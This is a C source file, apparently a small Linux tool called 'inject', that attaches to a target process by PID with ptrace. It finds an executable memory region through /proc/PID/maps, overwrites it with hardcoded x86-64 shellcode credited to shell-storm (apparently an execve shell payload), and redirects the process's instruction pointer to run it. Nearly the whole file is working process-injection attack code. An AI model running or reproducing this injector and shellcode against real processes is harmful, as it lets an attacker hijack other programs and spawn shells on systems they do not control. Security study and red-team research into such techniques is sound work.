#include <stdio.h>
#include <errno.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/ptrace.h>

#define PID_MAX 32768
#define PID_MAX_STR_LENGTH 64


// http://shell-storm.org/shellcode/files/shellcode-806.php
const char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                        "\x91\xd0\x8c\x97\xff\x48\xf7"
                        "\xdb\x53\x54\x5f\x99\x52\x57"
                        "\x54\x5e\xb0\x3b\x0f\x05";


int get_proc_pid_max() {
    FILE *pid_max_file = fopen("/proc/sys/kernel/pid_max", "r");

    if (pid_max_file == NULL) {
        fprintf(stderr, "Could not find proc/sys/kernel/pid_max file. "
                "Using default.\n");
        
        return PID_MAX;
    }
    
    char *pid_max_buffer = malloc(PID_MAX_STR_LENGTH * sizeof(char));
    if (fgets(pid_max_buffer, PID_MAX_STR_LENGTH * sizeof(char), pid_max_file) == NULL) {
        fprintf(stderr, "Could not read from /proc/sys/kernel/pid_max file "
                "Using default.\n");

        fclose(pid_max_file);
        free(pid_max_buffer);
        return PID_MAX;
    }
    
    long pid_max = strtol(pid_max_buffer, (char **)NULL, 10);
    if (pid_max == 0) {
        fprintf(stderr, "Could not parse /proc/sys/kernel/pid_max value. "
                "Not a number. Uisng default.\n");
        pid_max = PID_MAX;
    }

    free(pid_max_buffer);
    fclose(pid_max_file);
    return pid_max; 
}

char *get_permissions_from_line(char *line) {
    int first_space = -1;
    int second_space = -1;
    for (size_t i = 0; i < strlen(line); i++) {
        if (line[i] == ' ' && first_space == -1) {
            first_space = i + 1;
        }
        else if (line[i] == ' ' && first_space != -1) {
            second_space = i;
            break;
        }
    }
    
    if (first_space != -1 && second_space != -1 && second_space > first_space) {
        char *permissions = malloc(second_space - first_space + 1);
        if (permissions == NULL) {
            fprintf(stderr, "Could not allocate memory. Aborting.\n");
            return NULL;
        }
        for (size_t i = first_space, j = 0; i < (size_t)second_space; i++, j++) {
            permissions[j] = line[i];
        }
        permissions[second_space - first_space] = '\0';
        return permissions;
    }
    return NULL;

}

long get_address_from_line(char *line) {
    int address_last_occurance_index = -1;
    for (size_t i = 0; i < strlen(line); i++) {
        if (line[i] == '-') {
            address_last_occurance_index = i;
        }    
    }
    
    if (address_last_occurance_index == -1) {
        fprintf(stderr, "Could not parse address from line '%s'. Aborting.\n", line);
        return -1;
    }

    char *address_line = malloc(address_last_occurance_index + 1);
    if (address_line == NULL) {
        fprintf(stderr, "Could not allocate memory. Aborting.\n");
        return -1;
    }

    for (size_t i = 0; i < (size_t)address_last_occurance_index; i++) {

        address_line[i] = line[i];
    }
    
    address_line[address_last_occurance_index] = '\0';
    long address = strtol(address_line, (char **) NULL, 16);
    return address;
}

long parse_maps_file(long victim_pid) {
    size_t maps_file_name_length = PID_MAX_STR_LENGTH + 12;
    char *maps_file_name = malloc(maps_file_name_length);
    if (snprintf(maps_file_name, maps_file_name_length, "/proc/%ld/maps", victim_pid) < 0) {
        fprintf(stderr, "Could not use snprintf: %s", strerror(errno));
        return -1;
    }

    FILE *maps_file = fopen(maps_file_name, "r");
    if (maps_file == NULL) {
        fprintf(stderr, "Could not open %s file. Aborting.\n", maps_file_name);
        return -1; 
    }
    
    char *maps_line = NULL;
    size_t maps_line_length = 0;
    while (getline(&maps_line, &maps_line_length, maps_file) != -1) {
        char *permissions = get_permissions_from_line(maps_line);
        
        if (permissions == NULL) {
            continue;
        } else if (strncmp("r-xp", permissions, 4) == 0) {
            fprintf(stdout, "[*] Found section mapped with %s permissions.\n", permissions);
            free(permissions);
            break;
        }
        free(permissions);
    }

    
    long address = get_address_from_line(maps_line);

    free(maps_line);
    
    return address;
}


int main(int argc, const char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage:\n\t./inject PID\n\n"
                "\tPID - PID of the process to inject code.\n");
        exit(EXIT_FAILURE);
    }

    long pid_max = get_proc_pid_max();
    long victim_pid = strtol(argv[1], (char **) NULL, 10);

    if (victim_pid == 0 || victim_pid > pid_max) {
        fprintf(stderr, "Argument not a valid number. Aborting.\n");
        exit(EXIT_FAILURE);
    }


    // Attach to the victim process.
    if (ptrace(PTRACE_ATTACH, victim_pid, NULL, NULL) < 0) {
        fprintf(stderr, "Failed to PTRACE_ATTACH: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }
    wait(NULL);

    fprintf(stdout, "[*] Attach to the process with PID %ld.\n", victim_pid);

    // Save old register state.
    struct user_regs_struct old_regs;
    if (ptrace(PTRACE_GETREGS, victim_pid, NULL, &old_regs) < 0) {
        fprintf(stderr, "Failed to PTRACE_GETREGS: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    long address = parse_maps_file(victim_pid);
    
    size_t payload_size = strlen(SHELLCODE);
    uint64_t *payload = (uint64_t *)SHELLCODE;

    fprintf(stdout, "[*] Injecting payload at address 0x%lx.\n", address);
    for (size_t i = 0; i < payload_size; i += 8, payload++) {
        if (ptrace(PTRACE_POKETEXT, victim_pid, address + i, *payload) < 0) {
            fprintf(stderr, "Failed to PTRACE_POKETEXT: %s\n", strerror(errno));
            exit(EXIT_FAILURE);
        }
    }


    fprintf(stdout, "[*] Jumping to the injected code.\n");
    struct user_regs_struct regs;
    memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
    regs.rip = address;

    if (ptrace(PTRACE_SETREGS, victim_pid, NULL, &regs) < 0) {
        fprintf(stderr, "Failed to PTRACE_SETREGS: %s. \n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    if (ptrace(PTRACE_CONT, victim_pid, NULL, NULL) < 0) {
        fprintf(stderr, "Failed to PTRACE_CONT: %s. \n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    fprintf(stdout, "[*] Sucessfuly injected and jumped to the code.\n");

    return 0;
}
